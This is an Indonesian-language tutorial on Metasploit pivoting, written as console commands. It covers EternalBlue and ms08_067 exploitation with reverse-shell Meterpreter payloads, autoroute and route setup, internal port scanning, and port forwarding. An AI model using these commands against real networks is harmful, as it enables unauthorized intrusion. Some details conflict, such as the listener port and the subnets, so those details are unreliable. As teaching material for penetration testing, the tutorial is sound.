# Pivoting dan Route Command di Metasploit

## A. Apa Itu Pivoting?

[Pivoting](https://en.wikipedia.org/wiki/Exploit_(computer_security)#Pivoting) adalah teknik menggunakan sistem yang telah dikompromikan sebagai `hot point` untuk menyerang sistem lain di jaringan internal yang hanya bisa diakses dari dalam.

**Ada dua jenis pivoting:**
- Layer 3 pivoting (routing) -> menggunakan `autoroute` dan `route` di Metasploit.
- Layer 2 pivoting (`ARP spoofing`, `bridge`) -> biasanya dilakukan dengan tools seperti [ettercap](https://www.ettercap-project.org/) atau [bettercap](https://www.bettercap.org/).

## B. Syarat Pivoting di Metasploit

- Sudah ada Meterpreter session di host pertama (pivot point).
- Host tersebut punya akses ke jaringan internal yang ingin dijelajahi.
- Modul `autoroute` atau perintah `route` digunakan untuk menambahkan rute jaringan internal.

## C. Langkah-Langkah Melakukan Pivoting di Metasploit

### 1. Dapatkan Akses ke Mesin Pertama

Contoh:

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set RPORT 445
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
set LPORT 4444
exploit
```

Hasil output-nya seperti ini:

```
[+] 192.168.1.10:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.10:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.10:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

meterpreter >
```

Itu artinya kita sudah mendapatkan akses ke mesin pertama.
### 2. Tambahkan Route Internal dengan `autoroute`

Misalnya, mesin A bisa melihat jaringan internal `192.168.1.0/24`:

```
run autoroute -s 192.168.1.0/24
```

Keterangan:
- `-s` : (subnet) jaringan internal target: `192.168.1.0/24`

Atau manual:

```
background
route add 192.168.1.0 255.255.255.0 1
```

Angka `1` adalah session ID.

Cek route yang sudah ada:

```
route print
```

### 3. Gunakan `auxiliary/scanner` Melalui Route

Kamu sekarang bisa melakukan scanning ke internal network!

Contoh scanning host internal:

```
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.1-254
set PORTS 22,80,445
run
```

Ini akan meng-scan port (`22`,`80`,`445`) mulai dari host `192.168.1.1` sampai dengan host `192.168.1.254`.

### 4. Port Forwarding (Opsional)

Jika kamu ingin mengakses service internal dari browser (misalnya Web UI internal), gunakan port forward:

```
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.10.10
```

Keterangan:
- `-l` : Port listener: `8888`
- `-p` : Port tujuan di mesin target: `80`
- `-r` : IP target di jaringan internal korban yang akan diakses: `192.168.10.10`

Lalu, buka di browser kamu:

```
http://127.0.0.1:8080
```

### 5. Lanjutkan Eksploitasi ke Mesin Internal

Setelah tahu ada mesin internal dengan service aktif, kamu bisa lanjut menggunakan exploit yang sesuai:

```
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 192.168.10.20
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST 192.168.1.100
exploit
```

### Tips Tambahan

- Gunakan `arp` di Meterpreter untuk melihat host yang pernah diakses:

   ```
  meterpreter > arp
  ```

- Gunakan netstat untuk lihat koneksi:

  ```
  meterpreter > netstat
  ```

- Bisa chaining pivot lebih dari satu kali (multi-hop), tapi perlu VPN atau SOCKS proxy (contoh: `auxiliary/server/socks_proxy`).
